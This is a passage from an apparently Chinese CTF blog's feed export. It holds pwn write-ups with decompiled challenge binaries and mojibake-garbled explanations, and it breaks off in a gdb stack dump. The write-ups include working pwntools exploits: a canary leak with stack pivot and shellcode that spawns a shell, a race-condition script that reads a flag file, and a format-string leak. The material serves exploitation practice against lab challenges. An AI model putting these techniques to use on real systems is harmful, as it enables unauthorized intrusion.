[rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v9 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  v7 = &amp;v5;</span><br><span class="line">  v6 = <span class="number">0LL</span>;</span><br><span class="line">  ini(argc, argv, envp);</span><br><span class="line">  banner();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Format String 2/4&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;here,you must guess the random num&quot;</span>);</span><br><span class="line">  v3 = time(<span class="number">0LL</span>);</span><br><span class="line">  srand(v3);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    *v7 = rand();</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;guess...&quot;</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v6);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;leave something.....&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">0x20</span>uLL);</span><br><span class="line">    <span class="built_in">printf</span>(buf);</span><br><span class="line">    <span class="keyword">if</span> ( *v7 == v6 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;try again&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;You win!&quot;</span>);</span><br><span class="line">  system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="3-exp">3.exp</h2><p>æœ¬é¢˜ ä¸ç”¨ç¼–å†™è„šæœ¬å°±å¯ä»¥è·å¾—shell,ä¹‹éœ€è¦å…ˆè¾“å…¥%7$pç„¶åç­‰å¾…è¾“å‡ºçš„8å­—èŠ‚16è¿›åˆ¶æ•°,æŠŠé«˜ä½çš„å››å­—èŠ‚è¾“å…¥åˆ°v5å°±èƒ½è·å–shell.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1-æ£€æŸ¥é˜²æŠ¤&quot;&gt;1.æ£€æŸ¥é˜²æŠ¤&lt;/h2&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>database_in Write Up</title>
    <link href="https://www.fomal.cc/posts/a84fed8e.html"/>
    <id>https://www.fomal.cc/posts/a84fed8e.html</id>
    <published>2023-04-02T03:02:22.701Z</published>
    <updated>2023-04-02T03:03:01.999Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-æŸ¥çœ‹é˜²æŠ¤">1.æŸ¥çœ‹é˜²æŠ¤</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    No RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX disabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br><span class="line">RWX:      Has RWX segments</span><br></pre></td></tr></table></figure><p>å¼€å¯canaryç»•è¿‡å¹¶ä¸”æœ‰RWXæ®µ</p><h2 id="2-åˆ†ææ¼æ´">2.åˆ†ææ¼æ´</h2><p>ç”¨IDA_proåç¼–è¯‘å‘ç°ç™»å½•ç®¡ç†å‘˜è´¦æˆ·çš„å¯†ç è¾“å…¥é”™è¯¯ä¼šæŠŠcanaryæ³„éœ²å‡ºæ¥,å¹¶ä¸”è¾“å…¥å‡½æ•°æœ‰æ ˆæº¢å‡ºçš„æ¼æ´å¯ä»¥åˆ©ç”¨,</p><p>gdbè°ƒè¯•å‘ç°canaryè·ç¦»passwordæœ‰0x18çš„è·ç¦»,åˆ†æè¾“å…¥å¯†ç çš„å‡½æ•°</p><p>å‘ç°ä¸ä¼šè¯»å…¥æ¢è¡Œç¬¦,æ‰€ä»¥å¤šä¸€ä¸ªå­—èŠ‚å¡«å……æ¥è¦†ç›–canaryçš„ä½ä½â€™x\00â€™.</p><p>æ³„éœ²å‡ºcanaryå,ç”±äºcanaryå 8ä¸ªå­—èŠ‚,æ‰€ä»¥passwordèƒ½å¡«å……çš„å†…å®¹åªå‰©ä¸‹0x18ä¸ªå­—èŠ‚,ä¸èƒ½ç›´æ¥æŠŠshellcodeå¸ƒç½®åœ¨æ ˆä¸Šæ”»å‡».å› æ­¤æŠŠæ ˆè¿ç§»åˆ°æœ‰RWXæƒé™çš„bssä¸Šè¯»å…¥shellcode.</p><p>å…ˆåˆ©ç”¨æ³„éœ²çš„canaryæŠŠrbpè¿ç§»åˆ°bssçš„0x602800ä¸Šå¹¶ä¸”è®©æ‰§è¡Œæµè·³è½¬åˆ°å†æ¬¡è¯»å…¥å¯†ç çš„åœ°æ–¹è¿›è¡Œä¸‹ä¸€æ¬¡æ”»å‡»,å› ä¸ºå¤§å¤šæ˜¯ç”¨rbpè®¿é—®å˜é‡,æ‰€ä»¥åªéœ€æ”¹å˜rbp,éšåæŠŠè°ƒç”¨readçš„shellcodeè¾“å…¥åˆ°è¢«rbpå½“ä½œæ˜¯passwordçš„åŒºåŸŸ(0x6027e0)å¹¶æŠŠrbpæŒ‡å‘çš„å•å…ƒ(0x602800)å†…è¦†ç›–ä¸Šæ¯”readå‡½æ•°çš„å‚æ•°(0x602850)ç¨å¾®é«˜ä¸€äº›çš„åœ°å€(0x602880),æŠŠè¿”å›åœ°å€è¦†ç›–ä¸ºè¯»å…¥readæŒ‡ä»¤çš„èµ·å§‹ä½ç½®(0x6027e0).</p><p>å½“ç¨‹åºæ¥å—ç¬¬ä¸€æ¬¡çš„payloadä»¥åå°±ä¼šè®©rspä¹Ÿè¢«è¿ç§»åˆ°bssæ®µä¸Š,</p><p>æ­¤æ—¶ripå·²ç»æŒ‡å‘readå‡½æ•°å‡†å¤‡æ‰§è¡Œè¯»å…¥shellcodeçš„æ“ä½œ.</p><p>readå‡½æ•°åé¢è·Ÿç€call 0x602850æŒ‡ä»¤,åœ¨è¯»å…¥åripå°±ä¼šè·³è½¬æ‰§è¡Œshellcode.</p><h2 id="3-exploitation">3.exploitation</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">io=process(<span class="string">&#x27;./pwn2&#x27;</span>)</span><br><span class="line"><span class="comment">#io=gdb.debug(&#x27;./pwn2&#x27;,&#x27;b *0x400c15&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#æ³„éœ²canary</span></span><br><span class="line">io.sendlineafter(<span class="string">&quot;name&quot;</span>,<span class="string">b&#x27;cat_loves_her&#x27;</span>) <span class="comment">#ç®¡ç†å‘˜è´¦æˆ·</span></span><br><span class="line">io.sendlineafter(<span class="string">&quot;password&quot;</span>,<span class="number">0x19</span>*<span class="string">b&#x27;A&#x27;</span>) <span class="comment">#å¤šä¸€ä¸ªAæ¥è¦†ç›–canaryçš„ä½ä½</span></span><br><span class="line">io.recvuntil(<span class="number">0x18</span>*<span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line">canary=u64(io.recv(<span class="number">8</span>))-<span class="number">0x41</span> <span class="comment">#è§£åŒ…canary,æŠŠä½ä½æ”¹æˆx\00</span></span><br><span class="line">info(<span class="string">&#x27;canary:&#x27;</span>+<span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line"><span class="comment">#æ ˆè¿ç§»</span></span><br><span class="line">bss=<span class="number">0x602800</span></span><br><span class="line"><span class="comment">#inputPassword=0x400c7d</span></span><br><span class="line">payload1=<span class="number">0x18</span>*<span class="string">b&#x27;A&#x27;</span>+p64(canary)+p64(bss)+p64(<span class="number">0x400c7d</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&quot;password:&quot;</span>,payload1)</span><br><span class="line"></span><br><span class="line"><span class="comment">#ç³»ç»Ÿè°ƒç”¨read</span></span><br><span class="line">read=asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov rdi,0</span></span><br><span class="line"><span class="string">mov rsi,0x602850</span></span><br><span class="line"><span class="string">xor rax,rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)+<span class="string">b&#x27;\xe8\x58&#x27;</span> <span class="comment">#å¦‚æœrdxä¸ä¸º0é‚£ä¹ˆå°±ä¼šæ˜¯ä¸€ä¸ªè¶³å¤Ÿå¤§çš„åœ°å€å€¼,å¯ä»¥ç•¥å»å‡å°‘é•¿åº¦</span></span><br><span class="line">payload2=read.ljust(<span class="number">0x18</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(canary)+p64(bss+<span class="number">0x80</span>)+p64(<span class="number">0x6027e0</span>)</span><br><span class="line">pause(<span class="number">1</span>)</span><br><span class="line">io.sendline(payload2)</span><br><span class="line">pause(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#shellcode</span></span><br><span class="line">io.sendline(asm(shellcraft.sh()))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1-æŸ¥çœ‹é˜²æŠ¤&quot;&gt;1.æŸ¥çœ‹é˜²æŠ¤&lt;/h2&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;li</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>cpp primer plus Write Up</title>
    <link href="https://www.fomal.cc/posts/e77c14ac.html"/>
    <id>https://www.fomal.cc/posts/e77c14ac.html</id>
    <published>2023-04-02T03:02:22.698Z</published>
    <updated>2023-04-02T03:03:01.999Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-æºä»£ç ">1.æºä»£ç </h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">  <span class="keyword">if</span> ( flag &lt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = <span class="built_in">std</span>::operator&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;There is no book need to read&quot;</span>);</span><br><span class="line">    <span class="built_in">std</span>::ostream::operator&lt;&lt;(v8, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="type">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    vuln();</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">menu</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rax</span></span><br><span class="line">  __int64 v1; <span class="comment">// rax</span></span><br><span class="line">  __int64 v2; <span class="comment">// rax</span></span><br><span class="line">  __int64 v3; <span class="comment">// rax</span></span><br><span class="line">  __int64 v4; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  v0 = <span class="built_in">std</span>::operator&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;1.Borrow book&quot;</span>);</span><br><span class="line">  <span class="built_in">std</span>::ostream::operator&lt;&lt;(v0, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="type">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">  v1 = <span class="built_in">std</span>::operator&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;2.Return book&quot;</span>);</span><br><span class="line">  <span class="built_in">std</span>::ostream::operator&lt;&lt;(v1, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="type">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">  v2 = <span class="built_in">std</span>::operator&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;3.Read book&quot;</span>);</span><br><span class="line">  <span class="built_in">std</span>::ostream::operator&lt;&lt;(v2, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="type">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">  v3 = <span class="built_in">std</span>::operator&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;4.Show my book&quot;</span>);</span><br><span class="line">  <span class="built_in">std</span>::ostream::operator&lt;&lt;(v3, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="type">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">  v4 = <span class="built_in">std</span>::operator&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;5.Exit&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">std</span>::ostream::operator&lt;&lt;(v4, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="type">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">vuln</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">pthread_t</span> newthread; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span>::operator=(&amp;bookname[abi:cxx11], <span class="string">&quot;C++_primer_plus&quot;</span>);</span><br><span class="line">  pthread_create(&amp;newthread, <span class="number">0LL</span>, readbooks, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">readbooks</span><span class="params">(<span class="type">void</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v1; <span class="comment">// rax</span></span><br><span class="line">  FILE *stream; <span class="comment">// [rsp+8h] [rbp-88h]</span></span><br><span class="line">  <span class="type">char</span> dest[<span class="number">32</span>]; <span class="comment">// [rsp+10h] [rbp-80h] BYREF</span></span><br><span class="line">  <span class="type">char</span> ptr[<span class="number">88</span>]; <span class="comment">// [rsp+30h] [rbp-60h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+88h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  sleep(<span class="number">1u</span>);<span class="comment">//ä¸€ç§’æ—¶é—´</span></span><br><span class="line">  v1 = (<span class="type">const</span> <span class="type">char</span> *)<span class="built_in">std</span>::<span class="built_in">string</span>::c_str(&amp;bookname[abi:cxx11]);</span><br><span class="line">  <span class="built_in">strcpy</span>(dest, v1);</span><br><span class="line">  stream = fopen(dest, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  fread(ptr, <span class="number">1uLL</span>, <span class="number">0x50</span>uLL, stream);</span><br><span class="line">  <span class="built_in">puts</span>(ptr);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-æ¼æ´åˆ†æ">2.æ¼æ´åˆ†æ</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>æ£€æŸ¥å‘ç°ä¿æŠ¤å…¨å¼€,å½“æ‰‹ä¸Šæœ‰ä¸€æœ¬ä¹¦æ—¶,é€‰3 readbookæ—¶å¯ä»¥ä¼šåˆ›å»ºä¸€ä¸ªå­çº¿ç¨‹,æ–°çš„å‡½æ•°readbookæœ‰sleep(1)å‡½æ•°,åˆ©ç”¨è¿™ä¸€ç§’çš„æ—¶é—´ä¿®æ”¹å˜é‡booknameå°±å¯ä»¥è·å–åˆ°flag,æ­¤æ—¶çš„flagå°±æ˜¯ä¹¦å</p><h2 id="3-exp">3.exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io=remote(<span class="string">&#x27;ip&#x27;</span>,port)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Please enter your choice\n1.Borrow book\n2.Return book\n3.Read book\n4.Show my book\n5.Exit\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;1.Borrow book\n2.Return book\n3.Read book\n4.Show my book\n5.Exit\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Return success!\n1.Borrow book\n2.Return book\n3.Read book\n4.Show my book\n5.Exit\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Please input bookname\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;flag\x00&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;1.Borrow book\n2.Return book\n3.Read book\n4.Show my book\n5.Exit\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;1.Borrow book\n2.Return book\n3.Read book\n4.Show my book\n5.Exit\n&#x27;</span>)</span><br><span class="line">io.recvline()</span><br><span class="line">io.recvline()</span><br><span class="line">io.recvline()</span><br><span class="line">io.recvline()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1-æºä»£ç &quot;&gt;1.æºä»£ç &lt;/h2&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Cnary Write Up</title>
    <link href="https://www.fomal.cc/posts/21a3201b.html"/>
    <id>https://www.fomal.cc/posts/21a3201b.html</id>
    <published>2023-04-02T03:02:22.697Z</published>
    <updated>2023-04-02T03:03:01.997Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-æ£€æŸ¥é˜²æŠ¤">1.æ£€æŸ¥é˜²æŠ¤</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><h2 id="2-åˆ†ææ¼æ´">2.åˆ†ææ¼æ´</h2><p>é¢˜ç›®æœ‰æš—ç¤ºcanaryæ˜¯ä¸æ˜¯çœŸçš„å­˜åœ¨,æ‰€ä»¥ä½¿ç”¨gdbè°ƒè¯•,çœŸæ­£çš„canaryæœ«å°¾åº”è¯¥ä¼šå‡ºç°â€™\x00â€™,ä½†æ˜¯æ ˆç»“æ„ä¸­å¹¶æ²¡æœ‰æ‰¾åˆ°ç±»ä¼¼çš„,çŒœæµ‹æ˜¯æ²¡æœ‰å¼€å¯çš„</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">00:0000â”‚ esp 0xffffceb0 â€”â–¸ 0xffffcf48 â€”â–¸ 0xffffcfa8 â€”â–¸ 0xffffcfd8 â€”â–¸ 0xffffcfe8 â—‚â€” ...</span><br><span class="line">01:0004â”‚     0xffffceb4 â—‚â€” 0x1</span><br><span class="line">02:0008â”‚     0xffffceb8 â€”â–¸ 0x80da387 (_IO_2_1_stdin_+71) â—‚â€” 0xdb87c00</span><br><span class="line">03:000câ”‚     0xffffcebc â€”â–¸ 0x806cd47 (<span class="built_in">read</span>+39) â€”â–¸ 0xfff0003d â—‚â€” 0xfff0003d</span><br><span class="line">04:0010â”‚     0xffffcec0 â—‚â€” 0x1</span><br><span class="line">05:0014â”‚     0xffffcec4 â€”â–¸ 0x80ac668 â—‚â€” inc    esp /* <span class="string">&#x27;Do you really know Canary?&#x27;</span> */</span><br><span class="line">06:0018â”‚     0xffffcec8 â€”â–¸ 0x8053c79 (_IO_new_file_write+9) â—‚â€” add    ebx, 0x86387</span><br><span class="line">07:001câ”‚     0xffffcecc â€”â–¸ 0x80db1a0 (_IO_file_jumps) â—‚â€” 0x0</span><br><span class="line">08:0020â”‚     0xffffced0 â€”â–¸ 0x80dafc0 (_IO_wfile_jumps_maybe_mmap) â—‚â€” 0x0</span><br><span class="line">09:0024â”‚     0xffffced4 â€”â–¸ 0x80da000 (_GLOBAL_OFFSET_TABLE_) â—‚â€” 0x0</span><br><span class="line">0a:0028â”‚     0xffffced8 â€”â–¸ 0x80da340 (_IO_2_1_stdin_) â—‚â€” 0xfbad208b</span><br><span class="line">0b:002câ”‚     0xffffcedc â€”â–¸ 0x805431e (_IO_file_read+46) â—‚â€” add    esp, 0x10</span><br><span class="line">0c:0030â”‚     0xffffcee0 â—‚â€” 0x0</span><br><span class="line">0d:0034â”‚     0xffffcee4 â€”â–¸ 0x80da387 (_IO_2_1_stdin_+71) â—‚â€” 0xdb87c00</span><br><span class="line">0e:0038â”‚     0xffffcee8 â—‚â€” 0x1</span><br><span class="line">0f:003câ”‚     0xffffceec â€”â–¸ 0x80529bb (new_do_write+107) â—‚â€” mov    esi, eax</span><br><span class="line">10:0040â”‚     0xffffcef0 â€”â–¸ 0x80559c7 (_IO_switch_to_get_mode+7) â—‚â€” add    edx, 0x84639</span><br><span class="line">11:0044â”‚     0xffffcef4 â€”â–¸ 0x80542f6 (_IO_file_read+6) â—‚â€” add    ebx, 0x85d0a</span><br><span class="line">12:0048â”‚     0xffffcef8 â€”â–¸ 0x80db1a0 (_IO_file_jumps) â—‚â€” 0x0</span><br><span class="line">13:004câ”‚     0xffffcefc â€”â–¸ 0x8052be5 (_IO_new_file_underflow+293) â—‚â€” add    esp, 0x10</span><br><span class="line">14:0050â”‚     0xffffcf00 â€”â–¸ 0x80da340 (_IO_2_1_stdin_) â—‚â€” 0xfbad208b</span><br><span class="line">15:0054â”‚     0xffffcf04 â€”â–¸ 0x80da387 (_IO_2_1_stdin_+71) â—‚â€” 0xdb87c00</span><br><span class="line">16:0058â”‚     0xffffcf08 â—‚â€” 0x1</span><br><span class="line">17:005câ”‚     0xffffcf0c â€”â–¸ 0x80ac668 â—‚â€” inc    esp /* <span class="string">&#x27;Do you really know Canary?&#x27;</span> */</span><br><span class="line">18:0060â”‚     0xffffcf10 â—‚â€” 0x1a</span><br><span class="line">19:0064â”‚     0xffffcf14 â€”â–¸ 0x80dafc0 (_IO_wfile_jumps_maybe_mmap) â—‚â€” 0x0</span><br><span class="line">1a:0068â”‚     0xffffcf18 â€”â–¸ 0x805295b (new_do_write+11) â—‚â€” add    ebp, 0x876a5</span><br><span class="line">1b:006câ”‚     0xffffcf1c â€”â–¸ 0x80dd840 â—‚â€” 0x80dd840</span><br><span class="line">1c:0070â”‚     0xffffcf20 â—‚â€” 0xfbad2887</span><br><span class="line">1d:0074â”‚     0xffffcf24 â€”â–¸ 0x80da1e0 (_IO_2_1_stdout_) â—‚â€” 0xfbad2887</span><br><span class="line">1e:0078â”‚     0xffffcf28 â—‚â€” 0x354</span><br><span class="line">1f:007câ”‚     0xffffcf2c â€”â–¸ 0x80dafc0 (_IO_wfile_jumps_maybe_mmap) â—‚â€” 0x0</span><br><span class="line">20:0080â”‚     0xffffcf30 â€”â–¸ 0x80da1e0 